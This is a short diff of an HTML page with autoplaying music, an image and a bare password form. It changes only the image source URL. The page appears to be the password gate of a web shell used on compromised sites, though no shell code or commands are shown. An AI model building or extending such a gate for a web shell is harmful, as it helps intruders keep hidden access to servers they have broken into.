@@ -46,7 +46,7 @@ input[type=password] {
 <br>
 <header>
 <audio autoplay='1' loop='1'><source src='http://con7ext-exeuser.rhcloud.com/music/Re_Zero%20-%20Paradisus-Paradoxum.mp3' type='audio/mp3'/></audio>
-<img src='http://con7ext-exeuser.rhcloud.com/images/chaika.png' width='400' height='400' align='center'>
+<img src='https://ia801504.us.archive.org/22/items/unknown_201809/unknown.png' width='400' height='400' align='center'>
 <br>
 <br>
 <pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
